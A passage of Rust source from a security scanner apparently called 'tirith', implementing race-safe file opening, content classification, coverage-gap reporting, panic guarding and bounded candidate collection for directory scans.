        let policy_dir = path.and_then(|path| {
            if path.is_dir() {
                Some(path)
            } else {
                path.parent()
            }
        });
        let policy_dir = policy_dir
            .map(|path| path.to_string_lossy().into_owned())
            .filter(|path| !path.is_empty());
        let policy = crate::policy::Policy::discover(policy_dir.as_deref());
        crate::policy::freeze_captured_policy_dlp_patterns(&policy.dlp_custom_patterns);
        SCAN_DIAGNOSTIC_CONTEXTS.with(|contexts| {
            contexts.borrow_mut().push(ScanDiagnosticState {
                compiled: crate::redact::CompiledCustomPatterns::new_silent(
                    &policy.dlp_custom_patterns,
                ),
                output: crate::verdict::BoundedTextBuilder::new(),
            });
        });
        for diagnostic in policy_capture.drain() {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: policy diagnostic: {diagnostic}"
            ));
        }
        Self {
            policy_capture: Some(policy_capture),
            active: true,
        }
    }

    fn drain_policy_diagnostics(&self) {
        if let Some(capture) = self.policy_capture.as_ref() {
            for diagnostic in capture.drain() {
                emit_scan_diagnostic(format_args!(
                    "tirith: scan: policy diagnostic: {diagnostic}"
                ));
            }
        }
    }
}

impl Drop for ScanDiagnosticCapture {
    fn drop(&mut self) {
        if !self.active {
            return;
        }
        self.drain_policy_diagnostics();
        let output = SCAN_DIAGNOSTIC_CONTEXTS.with(|contexts| {
            contexts
                .borrow_mut()
                .pop()
                .map(|state| state.output.finish())
        });
        if let Some(output) = output {
            use std::io::Write as _;
            let mut stderr = std::io::stderr().lock();
            let _ = stderr.write_all(output.as_bytes());
            let _ = stderr.flush();
        }
        self.policy_capture.take();
        self.active = false;
    }
}

fn sanitize_scan_diagnostic_with_compiled(
    diagnostic: &str,
    compiled: &crate::redact::CompiledCustomPatterns,
) -> String {
    crate::output::sanitize_human_field_with_compiled(diagnostic, compiled)
}

fn emit_scan_diagnostic(arguments: std::fmt::Arguments<'_>) {
    let diagnostic = arguments.to_string();
    let captured = SCAN_DIAGNOSTIC_CONTEXTS.with(|contexts| {
        let mut contexts = contexts.borrow_mut();
        let Some(context) = contexts.last_mut() else {
            return false;
        };
        let diagnostic = sanitize_scan_diagnostic_with_compiled(&diagnostic, &context.compiled);
        context.output.push_str(&diagnostic);
        context.output.push_str("\n");
        true
    });
    if !captured {
        let compiled = crate::redact::CompiledCustomPatterns::new_silent(&[]);
        let diagnostic = sanitize_scan_diagnostic_with_compiled(&diagnostic, &compiled);
        eprintln!("{}", crate::verdict::bound_text_for_output(diagnostic));
    }
}

/// Scan a single file and return its [`ScanFileOutcome`].
///
/// A2d — ONE handle, bounded hash. We open ONCE (no-follow, refusing a symlinked
/// final component so a planted symlink can't redirect the read outside the
/// tree), `fstat` THAT open fd, and read/hash from the SAME handle — closing the
/// stat-then-swap-then-read-a-different-file TOCTOU a path-based stat+reopen would
/// leave. Every non-analysis outcome is a typed [`CoverageGap`] (`Oversized`,
/// `HashBudgetExceeded`, `Unreadable`, `Unsupported`) rather than a silent skip,
/// so a skip can never be read as "clean".
pub fn scan_single_file(file_path: &Path) -> ScanFileOutcome {
    let _diagnostics = ScanDiagnosticCapture::start(Some(file_path));
    // No rebinding: the read path IS the caller's path, so there is no earlier
    // validation for a later open to drift away from.
    scan_single_file_at(file_path, file_path, None)
}

fn scan_single_file_at(
    read_path: &Path,
    logical_path: &Path,
    expected_identity: Option<FileIdentity>,
) -> ScanFileOutcome {
    // Step budget 0: a single-file scan has no repository post-pass, so no
    // cross-workflow model is built and `WorkflowArtifactPoisoning` can never be
    // emitted here. One workflow file cannot prove a producer-to-consumer chain.
    let mut candidate =
        scan_candidate_at(read_path, logical_path, expected_identity, None, false, 0);
    let trailing_result = candidate.file_results.pop();
    if trailing_result
        .as_ref()
        .is_some_and(|result| !result.coverage_gaps.is_empty())
    {
        return ScanFileOutcome::Scanned(trailing_result.expect("file result was checked above"));
    }
    if let Some(gap) = candidate.coverage_gaps.into_iter().next() {
        return ScanFileOutcome::Skipped(gap);
    }
    if let Some(result) = trailing_result {
        return ScanFileOutcome::Scanned(result);
    }
    // A genuine unknown media file was byte-classified and intentionally
    // excluded. Preserve the source-compatible two-variant result without
    // inventing a coverage gap or claiming findings.
    ScanFileOutcome::Scanned(FileScanResult {
        path: logical_path.to_path_buf(),
        findings: Vec::new(),
        is_config_file: false,
        coverage_gaps: Vec::new(),
    })
}

impl CandidateScanResult {
    fn scanned(result: FileScanResult) -> Self {
        let coverage_gaps = result.coverage_gaps.clone();
        Self {
            file_results: vec![result],
            coverage_gaps,
            intentionally_ignored: false,
            workflow: None,
        }
    }

    fn skipped(gap: CoverageGap) -> Self {
        Self {
            file_results: Vec::new(),
            coverage_gaps: vec![gap],
            intentionally_ignored: false,
            workflow: None,
        }
    }

    fn ignored() -> Self {
        Self {
            file_results: Vec::new(),
            coverage_gaps: Vec::new(),
            intentionally_ignored: true,
            workflow: None,
        }
    }
}

fn sha256_bytes(bytes: &[u8]) -> String {
    use sha2::{Digest as _, Sha256};
    hex::encode(Sha256::digest(bytes))
}

/// Open exactly once, classify the opened bytes, then dispatch. Filename
/// suffixes never select the analyzer before this point: they only distinguish
/// an intentional unknown-media exclusion from a malformed/unsupported subject,
/// or identify a package format (for example a ZIP named `*.whl`) after magic
/// has already proved the content family.
fn scan_candidate_at(
    read_path: &Path,
    logical_path: &Path,
    expected_identity: Option<FileIdentity>,
    threat_db: Option<&crate::threatdb::ThreatDb>,
    inspect_artifacts: bool,
    workflow_step_budget: usize,
) -> CandidateScanResult {
    let location = SubjectLocation::from_path(logical_path.to_path_buf());

    // Open no-follow with NO byte cap so we get the handle even for an oversized
    // file (we want to classify + hash it, not reject it outright). `open` reads
    // nothing, so a multi-terabyte file is fine here; the size gate is below.
    let file = match crate::util::open_read_no_follow_capped(read_path, u64::MAX) {
        Ok(f) => f,
        Err(crate::util::OpenRegularError::NotFound) => {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: cannot read {} (not found)",
                logical_path.display()
            ));
            return CandidateScanResult::skipped(CoverageGap {
                location,
                kind: CoverageGapKind::Unreadable,
                sha256: None,
            });
        }
        Err(crate::util::OpenRegularError::NotRegularFile) => {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: skipping {} (symlink or non-regular file)",
                logical_path.display()
            ));
            return CandidateScanResult::skipped(CoverageGap {
                location,
                kind: CoverageGapKind::Unreadable,
                sha256: None,
            });
        }
        // `TooLarge` cannot occur with a `u64::MAX` cap, but classify it as
        // unreadable for totality rather than panicking.
        Err(crate::util::OpenRegularError::TooLarge)
        | Err(crate::util::OpenRegularError::Io(_)) => {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: cannot read {}",
                logical_path.display()
            ));
            return CandidateScanResult::skipped(CoverageGap {
                location,
                kind: CoverageGapKind::Unreadable,
                sha256: None,
            });
        }
    };

    // A linked config was validated as in-root at collection time by a path that
    // `open_read_no_follow_capped` re-walks here. That open refuses only a
    // symlinked FINAL component, so an intermediate directory swapped in between
    // would redirect this read outside the root. Prove the handle names the same
    // file that passed containment, and treat a mismatch — or an identity we
    // cannot read — as a coverage gap rather than scanning an unvalidated file.
    if let Some(expected) = expected_identity {
        if FileIdentity::of(&file) != Some(expected) {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: {} no longer resolves to the file that passed containment",
                logical_path.display()
            ));
            return CandidateScanResult::skipped(CoverageGap {
                location,
                kind: CoverageGapKind::Unreadable,
                sha256: None,
            });
        }
    }

    // Size from the OPEN fd (the inode we will read), not a fresh path stat.
    let size = match file.metadata() {
        Ok(m) => m.len(),
        Err(e) => {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: cannot stat {}: {e}",
                logical_path.display()
            ));
            return CandidateScanResult::skipped(CoverageGap {
                location,
                kind: CoverageGapKind::Unreadable,
                sha256: None,
            });
        }
    };

    // A large artifact can still use the bounded streaming artifact analyzer.
    // Read only the classifier prefix from this same handle before consulting
    // the suffix as a package-format hint.
    if size > MAX_FILE_SIZE {
        use std::io::{Read as _, Seek as _};
        let mut prefix = Vec::with_capacity(crate::content_kind::MAGIC_PREFIX_BYTES);
        let prefix_read = (&file)
            .take(crate::content_kind::MAGIC_PREFIX_BYTES as u64)
            .read_to_end(&mut prefix);
        if prefix_read.is_err() || (&file).seek(std::io::SeekFrom::Start(0)).is_err() {
            return CandidateScanResult::skipped(CoverageGap {
                location,
                kind: CoverageGapKind::Unreadable,
                sha256: None,
            });
        }
        let classification = crate::content_kind::classify_with_ambiguity(&prefix);
        if inspect_artifacts
            && classify_collected_path(logical_path) == CollectedFileKind::ArtifactCandidate
            && matches!(
                classification.kind,
                crate::content_kind::ContentKind::Zip
                    | crate::content_kind::ContentKind::Gzip
                    | crate::content_kind::ContentKind::Elf
                    | crate::content_kind::ContentKind::MachO
                    | crate::content_kind::ContentKind::Pe
                    | crate::content_kind::ContentKind::Wasm
            )
            && size <= crate::artifact::inspect::ARTIFACT_MAX_FILE_SIZE
        {
            let (file_results, coverage_gaps) =
                inspect_artifact_candidate_from_handle(logical_path, file, None, threat_db);
            return CandidateScanResult {
                file_results,
                coverage_gaps,
                intentionally_ignored: false,
                workflow: None,
            };
        }

        // Too large for text/PDF analysis (or for the available artifact
        // analyzer): record a bounded hash gap from the same handle.
        let kind = oversized_gap_kind(size, MAX_COVERAGE_HASH_BYTES);
        let sha256 = match kind {
            CoverageGapKind::HashBudgetExceeded => None,
            _ => match crate::util::sha256_from_handle(file, MAX_COVERAGE_HASH_BYTES) {
                Ok(crate::util::HashOutcome::Digest(hex)) => Some(hex),
                Ok(crate::util::HashOutcome::BudgetExceeded) | Err(_) => None,
            },
        };
        emit_scan_diagnostic(format_args!(
            "tirith: scan: skipping {} (exceeds {}B analysis limit: {})",
            logical_path.display(),
            MAX_FILE_SIZE,
            kind.as_str()
        ));
        return CandidateScanResult::skipped(CoverageGap {
            location,
            kind,
            sha256,
        });
    }

    // Within the analysis ceiling: read the content from the same handle. A
    // mid-read I/O fault is an `Unreadable` gap (not a silent skip).
    let raw_bytes = {
        use std::io::Read as _;
        let mut buf = Vec::with_capacity(size as usize);
        // `take(MAX_FILE_SIZE + 1)` guards against a post-stat grow; a file that
        // grew past the ceiling between the stat and the read is treated as
        // oversized rather than buffered unbounded.
        match (&file)
            .take(MAX_FILE_SIZE.saturating_add(1))
            .read_to_end(&mut buf)
        {
            Ok(_) if buf.len() as u64 > MAX_FILE_SIZE => {
                // Hash from the SAME open handle (matching the oversized arm
                // above), not by re-opening `file_path`: a path reopen here is a
                // TOCTOU window where a swap between the read and the reopen could
                // hash a different inode. The prior read left the cursor at EOF, so
                // rewind to the start before streaming the hash.
                use std::io::Seek as _;
                // If the grown file is too big to even hash within budget, keep the
                // STRONGER `HashBudgetExceeded` kind (always security-relevant) rather
                // than collapsing it to `Oversized` with no digest. The read was capped
                // at `MAX_FILE_SIZE + 1`, so the true size is unknown here; the hash
                // outcome (not a size compare) is what tells us the budget was blown.
                let (sha256, kind) = match (&file).seek(std::io::SeekFrom::Start(0)) {
                    Ok(_) => match crate::util::sha256_from_handle(file, MAX_COVERAGE_HASH_BYTES) {
                        Ok(crate::util::HashOutcome::Digest(hex)) => {
                            (Some(hex), CoverageGapKind::Oversized)
                        }
                        Ok(crate::util::HashOutcome::BudgetExceeded) => {
                            (None, CoverageGapKind::HashBudgetExceeded)
                        }
                        Err(_) => (None, CoverageGapKind::Oversized),
                    },
                    Err(_) => (None, CoverageGapKind::Oversized),
                };
                emit_scan_diagnostic(format_args!(
                    "tirith: scan: skipping {} (grew past {}B analysis limit during read)",
                    logical_path.display(),
                    MAX_FILE_SIZE
                ));
                return CandidateScanResult::skipped(CoverageGap {
                    location,
                    kind,
                    sha256,
                });
            }
            Ok(_) => buf,
            Err(e) => {
                emit_scan_diagnostic(format_args!(
                    "tirith: scan: cannot read {}: {e}",
                    logical_path.display()
                ));
                return CandidateScanResult::skipped(CoverageGap {
                    location,
                    kind: CoverageGapKind::Unreadable,
                    sha256: None,
                });
            }
        }
    };

    let classification = crate::content_kind::classify_with_ambiguity(&raw_bytes);
    if classification.kind == crate::content_kind::ContentKind::Pdf
        && classification.ambiguous_pdf_ownership
    {
        // A structurally coherent trailing ZIP (including ZIP64) means the PDF
        // analyzer cannot claim exclusive ownership. Recursive/polyglot archive
        // dispatch is intentionally bounded elsewhere, so fail closed with an
        // explicit coverage gap instead of scanning only the PDF projection and
        // silently declaring the appended archive clean.
        return CandidateScanResult::skipped(CoverageGap {
            location,
            kind: CoverageGapKind::Unsupported,
            sha256: Some(sha256_bytes(&raw_bytes)),
        });
    }
    match classification.kind {
        crate::content_kind::ContentKind::Text | crate::content_kind::ContentKind::Pdf => {}
        crate::content_kind::ContentKind::UnknownBinary => {
            if classify_collected_path(logical_path) == CollectedFileKind::BinaryIgnored {
                return CandidateScanResult::ignored();
            }
            return CandidateScanResult::skipped(CoverageGap {
                location,
                kind: CoverageGapKind::Unsupported,
                sha256: Some(sha256_bytes(&raw_bytes)),
            });
        }
        crate::content_kind::ContentKind::Zip
        | crate::content_kind::ContentKind::Gzip
        | crate::content_kind::ContentKind::Elf
        | crate::content_kind::ContentKind::MachO
        | crate::content_kind::ContentKind::Pe
        | crate::content_kind::ContentKind::Wasm => {
            if inspect_artifacts
                && classify_collected_path(logical_path) == CollectedFileKind::ArtifactCandidate
            {
                use std::io::Seek as _;
                if (&file).seek(std::io::SeekFrom::Start(0)).is_err() {
                    return CandidateScanResult::skipped(CoverageGap {
                        location,
                        kind: CoverageGapKind::Unreadable,
                        sha256: None,
                    });
                }
                let fallback_sha256 = Some(sha256_bytes(&raw_bytes));
                let (file_results, coverage_gaps) = inspect_artifact_candidate_from_handle(
                    logical_path,
                    file,
                    fallback_sha256,
                    threat_db,
                );
                return CandidateScanResult {
                    file_results,
                    coverage_gaps,
                    intentionally_ignored: false,
                    workflow: None,
                };
            }
            return CandidateScanResult::skipped(CoverageGap {
                location,
                kind: CoverageGapKind::Unsupported,
                sha256: Some(sha256_bytes(&raw_bytes)),
            });
        }
    }

    // Text and PDF both enter FileScan. The engine's rendered-content stage owns
    // PDF extraction; valid UTF-8 wins over a misleading media/native suffix.
    let content = String::from_utf8_lossy(&raw_bytes).into_owned();

    let is_config = is_priority_file(logical_path);

    let cwd = logical_path
        .parent()
        .map(|p| p.display().to_string())
        .filter(|s| !s.is_empty());
    let ctx = AnalysisContext {
        input: content,
        shell: ShellType::Posix,
        scan_context: ScanContext::FileScan,
        raw_bytes: Some(raw_bytes),
        interactive: false,
        cwd: cwd.clone(),
        file_path: Some(logical_path.to_path_buf()),
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
    };

    let (verdict, pdf_coverage) = engine::analyze_file_with_pdf_coverage(&ctx);
    let coverage_gaps = pdf_analyzer_coverage_gap(
        SubjectLocation::from_path(logical_path.to_path_buf()),
        ctx.raw_bytes.as_deref().unwrap_or_default(),
        &pdf_coverage,
    )
    .into_iter()
    .collect();

    let policy = crate::policy::Policy::discover(cwd.as_deref());
    let mut findings = verdict.findings;
    engine::filter_findings_by_paranoia_vec(&mut findings, policy.paranoia);

    // C15: build the cross-workflow model from the content already decoded
    // above. Re-opening the path here would be a TOCTOU window onto a different
    // inode, and this scan has already paid for the read.
    let workflow = (workflow_step_budget > 0
        && crate::rules::cifile::classify(Some(logical_path))
            == Some(crate::rules::cifile::CiFileKind::GithubWorkflow))
    .then(|| {
        crate::rules::workflow_artifacts::build_model(
            logical_path,
            &ctx.input,
            workflow_step_budget,
        )
    });

    let mut outcome = CandidateScanResult::scanned(FileScanResult {
        path: logical_path.to_path_buf(),
        findings,
        is_config_file: is_config,
        coverage_gaps,
    });
    outcome.workflow = workflow;
    outcome
}

/// The scan dispatch is the single seam that turns parser-local typed PDF
/// coverage into a path-qualified, serializable coverage gap. The individual
/// reasons remain represented by the analyzer's `AnalysisIncomplete` finding;
/// one gap per file avoids multiplying identical UI/exit-state rows.
fn pdf_analyzer_coverage_gap(
    location: SubjectLocation,
    raw_bytes: &[u8],
    reasons: &[String],
) -> Option<CoverageGap> {
    (!reasons.is_empty()).then(|| CoverageGap {
        location,
        kind: CoverageGapKind::PdfAnalyzerIncomplete,
        sha256: Some(sha256_bytes(raw_bytes)),
    })
}

/// Wrap `f` in `catch_unwind` for the directory walk: on panic, log a skip and
/// return `None` so the caller can record a `Panicked` coverage gap and continue.
/// Only effective in `panic = "unwind"` builds. `AssertUnwindSafe` is sound only
/// while the closure captures no mutable state used after a panic (today: `&Path`
/// + a fn pointer).
fn catch_panic_scanning<T>(file_path: &Path, f: impl FnOnce() -> T) -> Option<T> {
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(f)) {
        Ok(v) => Some(v),
        Err(_) => {
            emit_scan_diagnostic(format_args!(
                "tirith: scan: internal error scanning {} (skipped — see panic message above)",
                file_path.display()
            ));
            None
        }
    }
}

/// A rule panicked while scanning a file (already reported on stderr by the
/// panic hook + [`catch_panic_scanning`]). Retained for back-compat; the guarded
/// scan now surfaces a panic as a [`CoverageGapKind::Panicked`] gap via
/// [`GuardedScanOutcome::RulePanic`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct RulePanic;

/// Scan a single file with the same per-file panic guard the directory walk
/// uses, for long-lived/server callers (the MCP server, `policy test`) that must
/// not crash on a crafted file. Returns a [`GuardedScanOutcome`]:
/// - `Completed(Scanned(result))` — the file was analyzed;
/// - `Completed(Skipped(gap))` — skipped with a typed reason (oversized /
///   unreadable / hash-budget);
/// - `RulePanic(gap)` — a rule panicked; the gap's kind is
///   [`CoverageGapKind::Panicked`] so the caller degrades to an error and records
///   the incompleteness instead of unwinding.
///
/// One-shot CLI `scan <file>` may use either this or [`scan_single_file`]
/// directly; the directory walk routes through here so a per-file panic becomes a
/// recorded gap rather than a process crash.
pub fn scan_single_file_guarded(file_path: &Path) -> GuardedScanOutcome {
    let _diagnostics = ScanDiagnosticCapture::start(Some(file_path));
    scan_single_file_guarded_at(file_path, file_path, None)
}

fn scan_candidate_guarded_at(
    read_path: &Path,
    logical_path: &Path,
    expected_identity: Option<FileIdentity>,
    threat_db: Option<&crate::threatdb::ThreatDb>,
    workflow_step_budget: usize,
) -> GuardedCandidateOutcome {
    match catch_panic_scanning(logical_path, || {
        scan_candidate_at(
            read_path,
            logical_path,
            expected_identity,
            threat_db,
            true,
            workflow_step_budget,
        )
    }) {
        Some(outcome) => GuardedCandidateOutcome::Completed(outcome),
        None => GuardedCandidateOutcome::RulePanic(CoverageGap {
            location: SubjectLocation::from_path(logical_path.to_path_buf()),
            kind: CoverageGapKind::Panicked,
            sha256: None,
        }),
    }
}

fn scan_single_file_guarded_at(
    read_path: &Path,
    logical_path: &Path,
    expected_identity: Option<FileIdentity>,
) -> GuardedScanOutcome {
    match catch_panic_scanning(logical_path, || {
        scan_single_file_at(read_path, logical_path, expected_identity)
    }) {
        Some(outcome) => GuardedScanOutcome::Completed(outcome),
        None => GuardedScanOutcome::RulePanic(CoverageGap {
            location: SubjectLocation::from_path(logical_path.to_path_buf()),
            kind: CoverageGapKind::Panicked,
            sha256: None,
        }),
    }
}

/// Scan content from stdin (no file path).
pub fn scan_stdin(content: &str, raw_bytes: &[u8]) -> FileScanResult {
    let current_dir = std::env::current_dir().ok();
    let _diagnostics = ScanDiagnosticCapture::start(current_dir.as_deref());
    let cwd = current_dir.map(|p| p.display().to_string());
    let ctx = AnalysisContext {
        input: content.to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::FileScan,
        raw_bytes: Some(raw_bytes.to_vec()),
        interactive: false,
        cwd: cwd.clone(),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
    };

    let (verdict, pdf_coverage) = engine::analyze_file_with_pdf_coverage(&ctx);
    let coverage_gaps = pdf_analyzer_coverage_gap(
        SubjectLocation::from_path(PathBuf::from("<stdin>")),
        raw_bytes,
        &pdf_coverage,
    )
    .into_iter()
    .collect();

    let policy = crate::policy::Policy::discover(cwd.as_deref());
    let mut findings = verdict.findings;
    engine::filter_findings_by_paranoia_vec(&mut findings, policy.paranoia);

    FileScanResult {
        path: PathBuf::from("<stdin>"),
        findings,
        is_config_file: false,
        coverage_gaps,
    }
}

/// Priority if the basename is AI-specific, or the file sits in a known config dir.
fn is_priority_file(path: &Path) -> bool {
    let basename = path.file_name().and_then(|n| n.to_str()).unwrap_or("");

    if PRIORITY_BASENAMES.contains(&basename) {
        return true;
    }

    if let Some(parent) = path.parent() {
        let parent_name = parent.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if PRIORITY_PARENT_DIRS.contains(&parent_name) {
            return true;
        }
    }

    false
}

/// How the directory walk classifies one regular-file entry during collection.
/// These are suffix HINTS only. Collection retains every matching regular file;
/// the opened bytes decide whether it is text/PDF, a supported artifact, or an
/// unknown binary. `BinaryIgnored` becomes a non-gap only in that last branch.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CollectedFileKind {
    /// Filename has no binary/artifact hint.
    TextCandidate,
    /// A native/packaging artifact (`.so`/`.dylib`/`.node`/`.wasm`/`.whl`) with
    /// a package/native scheduling hint after byte classification.
    ArtifactCandidate,
    /// Ordinary media hint; valid UTF-8 or known magic still overrides it.
    BinaryIgnored,
}

/// The result of a collection walk: ordinary text paths, safe linked-config
/// paths, artifact candidates, and gaps encountered before analysis.
struct CollectedFiles {
    text_candidates: Vec<PathBuf>,
    linked_text_candidates: Vec<LinkedTextCandidate>,
    artifact_candidates: Vec<PathBuf>,
    coverage_gaps: Vec<CoverageGap>,
    /// Complete count of matching candidates classified within the collection
    /// work budget. In bounded mode this can exceed the number retained below.
    candidate_total: usize,
    candidate_limit: Option<usize>,
    bounded_candidates: std::collections::BinaryHeap<CollectedCandidate>,
    collection_work_remaining: Option<usize>,
    /// Cheap `ReadDir` results may be examined beyond the metadata/work heap so
    /// filesystem order cannot hide a priority file just past the work limit.
    /// This separate global ceiling still makes adversarial traversal finite.
    collection_enumeration_remaining: Option<usize>,
    collection_work_exhausted: bool,
    collection_unclassified_entries: usize,
    /// A `.github/workflows/*` file the caller's `--ignore` / `--include` /
    /// `--exclude` patterns dropped before analysis. Pattern filters are an
    /// intentional exclusion, so they record no coverage gap, but a dropped
    /// workflow is still a workflow the cross-workflow post-pass never saw and
    /// therefore cannot claim the absence of a chain across.
    workflow_pattern_filtered: bool,
}

#[derive(Debug)]
struct LinkedTextCandidate {
    /// The resolved, regular in-root file opened with no-follow semantics.
    read_path: PathBuf,
    /// The config symlink path exposed to rules, findings, and callers.
    logical_path: PathBuf,
    /// Identity of the file that passed containment, so the later open can
    /// prove it reached the same file.
    identity: Option<FileIdentity>,
}

#[derive(Debug)]
enum CollectedCandidate {
    Text(PathBuf),
    Linked(LinkedTextCandidate),
    Artifact(PathBuf),
}

impl CollectedCandidate {
    fn logical_path(&self) -> &Path {
        match self {
            Self::Text(path) | Self::Artifact(path) => path,
            Self::Linked(candidate) => &candidate.logical_path,
        }
    }

    fn read_path(&self) -> &Path {
        match self {
            Self::Text(path) | Self::Artifact(path) => path,
            Self::Linked(candidate) => &candidate.read_path,
        }
    }

    const fn kind_rank(&self) -> u8 {
        match self {
            Self::Text(_) => 0,
            Self::Linked(_) => 1,
            Self::Artifact(_) => 2,
        }
    }
}

fn collected_candidate_cmp(a: &CollectedCandidate, b: &CollectedCandidate) -> std::cmp::Ordering {
    // Priority candidates sort first, followed by the logical path and stable
    // tie-breakers. This is a total order, so bounded retention is independent
    // of filesystem enumeration order.
    is_priority_file(b.logical_path())
        .cmp(&is_priority_file(a.logical_path()))
        .then_with(|| a.logical_path().cmp(b.logical_path()))
        .then_with(|| a.kind_rank().cmp(&b.kind_rank()))
        .then_with(|| a.read_path().cmp(b.read_path()))
}

impl PartialEq for CollectedCandidate {
    fn eq(&self, other: &Self) -> bool {
        collected_candidate_cmp(self, other).is_eq()
    }
}

impl Eq for CollectedCandidate {}

impl PartialOrd for CollectedCandidate {
    fn partial_cmp(&self, other: &Self) -> Option<std::cmp::Ordering> {
        Some(self.cmp(other))
    }
}

impl Ord for CollectedCandidate {
    fn cmp(&self, other: &Self) -> std::cmp::Ordering {
        collected_candidate_cmp(self, other)
    }
}

impl CollectedFiles {
    #[cfg(test)]
    fn unbounded() -> Self {
        Self::with_limits(None, None)
    }

    fn with_limits(candidate_limit: Option<usize>, collection_work: Option<usize>) -> Self {
        Self {
            text_candidates: Vec::new(),
            linked_text_candidates: Vec::new(),
            artifact_candidates: Vec::new(),
            coverage_gaps: Vec::new(),
            candidate_total: 0,
            candidate_limit,
            bounded_candidates: std::collections::BinaryHeap::new(),
            collection_work_remaining: collection_work,
            collection_enumeration_remaining: collection_work
                .map(|_| COLLECTION_ENUMERATION_CEILING),
            collection_work_exhausted: false,
            collection_unclassified_entries: 0,
            workflow_pattern_filtered: false,
        }
    }

    fn push_candidate(&mut self, candidate: CollectedCandidate) {
        self.candidate_total = self.candidate_total.saturating_add(1);
        let Some(limit) = self.candidate_limit else {
            self.distribute_candidate(candidate);
            return;
        };
        if limit == 0 {
            return;
        }
        if self.bounded_candidates.len() < limit {
            self.bounded_candidates.push(candidate);
        } else if self
            .bounded_candidates
            .peek()
            .is_some_and(|worst| collected_candidate_cmp(&candidate, worst).is_lt())
        {
            self.bounded_candidates.pop();
            self.bounded_candidates.push(candidate);
        }
    }

    fn push_text(&mut self, path: PathBuf) {
        self.push_candidate(CollectedCandidate::Text(path));
    }

    fn push_linked(&mut self, candidate: LinkedTextCandidate) {
        self.push_candidate(CollectedCandidate::Linked(candidate));
    }

    fn push_artifact(&mut self, path: PathBuf) {
        self.push_candidate(CollectedCandidate::Artifact(path));
    }

    fn distribute_candidate(&mut self, candidate: CollectedCandidate) {
        match candidate {
            CollectedCandidate::Text(path) => self.text_candidates.push(path),
            CollectedCandidate::Linked(candidate) => self.linked_text_candidates.push(candidate),
            CollectedCandidate::Artifact(path) => self.artifact_candidates.push(path),
        }
    }

    fn finish_bounded_candidates(&mut self) {
        let candidates = std::mem::take(&mut self.bounded_candidates).into_sorted_vec();
        for candidate in candidates {
            self.distribute_candidate(candidate);
        }
    }

    /// Record that a pattern filter dropped a candidate. Only a GitHub workflow
    /// matters here: the cross-workflow post-pass is the only analysis whose
    /// conclusions depend on having seen the WHOLE set of a repository's
    /// workflows, so filtering out anything else costs it nothing.
    fn note_pattern_filtered(&mut self, path: &Path) {
        if crate::rules::cifile::classify(Some(path))
            == Some(crate::rules::cifile::CiFileKind::GithubWorkflow)
        {
            self.workflow_pattern_filtered = true;
        }
    }

    fn note_unclassified_entries(&mut self, count: usize) {
        if count == 0 {
            return;
        }
        self.collection_work_exhausted = true;
        self.collection_unclassified_entries =
            self.collection_unclassified_entries.saturating_add(count);
    }
}

/// The identity of a file on disk, taken from an OPEN handle so it names the
/// object rather than a pathname another process can redirect.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct FileIdentity {
    #[cfg(unix)]
    device: u64,
    #[cfg(unix)]
    inode: u64,
    #[cfg(windows)]
    volume_serial: u32,
    #[cfg(windows)]
    file_index: u64,
}

impl FileIdentity {
    #[cfg(unix)]
    fn of(file: &std::fs::File) -> Option<Self> {
        use std::os::unix::fs::MetadataExt as _;

        let metadata = file.metadata().ok()?;
        Some(Self {
            device: metadata.dev(),
            inode: metadata.ino(),
        })
    }

    #[cfg(windows)]
    fn of(file: &std::fs::File) -> Option<Self> {
        use std::os::windows::io::AsRawHandle as _;
        use windows_sys::Win32::Storage::FileSystem::{
            GetFileInformationByHandle, BY_HANDLE_FILE_INFORMATION,
        };

        // `MetadataExt::volume_serial_number` / `file_index` are still unstable
        // (`windows_by_handle`), so read the same fields straight from the
        // handle instead of pinning this to nightly.
        let mut info = BY_HANDLE_FILE_INFORMATION::default();
        // SAFETY: the handle is live for the call and `info` is writable.
        if unsafe { GetFileInformationByHandle(file.as_raw_handle() as _, &mut info) } == 0 {
            return None;
        }
        Some(Self {
            volume_serial: info.dwVolumeSerialNumber,
            file_index: (u64::from(info.nFileIndexHigh) << 32) | u64::from(info.nFileIndexLow),
        })
    }

    #[cfg(not(any(unix, windows)))]
    fn of(_file: &std::fs::File) -> Option<Self> {
        None
    }
}

enum ScanCandidate {
    Text {
        read_path: PathBuf,
        logical_path: PathBuf,
        /// Set only for a linked config, whose `read_path` is a resolved target
        /// rather than the walked path. `None` means the read path IS the
        /// walked path and needs no rebinding.
        expected_identity: Option<FileIdentity>,
    },
}

impl ScanCandidate {
    fn logical_path(&self) -> &Path {
        match self {
            ScanCandidate::Text { logical_path, .. } => logical_path,
        }
    }
}

/// Collect files from a path (directory or single file).
fn collect_files(
    path: &Path,
    recursive: bool,
    ignore_patterns: &[String],
    include_patterns: &[String],
    exclude_patterns: &[String],
) -> CollectedFiles {
    collect_files_with_limits(
        path,
        recursive,
        ignore_patterns,
        include_patterns,
        exclude_patterns,
        None,
        None,
    )
}

const COLLECTION_WORK_FLOOR: usize = 1_024;
const COLLECTION_WORK_PER_RETAINED_CANDIDATE: usize = 32;
const COLLECTION_WORK_CEILING: usize = 1_000_000;
const COLLECTION_ENUMERATION_CEILING: usize = 1_000_000;

fn collection_work_limit(max_files: usize) -> usize {
    max_files
        .saturating_mul(COLLECTION_WORK_PER_RETAINED_CANDIDATE)
        .clamp(COLLECTION_WORK_FLOOR, COLLECTION_WORK_CEILING)
}

fn collect_files_for_scan(
    path: &Path,
    recursive: bool,
    ignore_patterns: &[String],
    include_patterns: &[String],
    exclude_patterns: &[String],
    max_files: Option<usize>,
) -> CollectedFiles {
    collect_files_with_limits(
        path,
        recursive,
        ignore_patterns,
        include_patterns,
        exclude_patterns,
        max_files,
        max_files.map(collection_work_limit),
    )
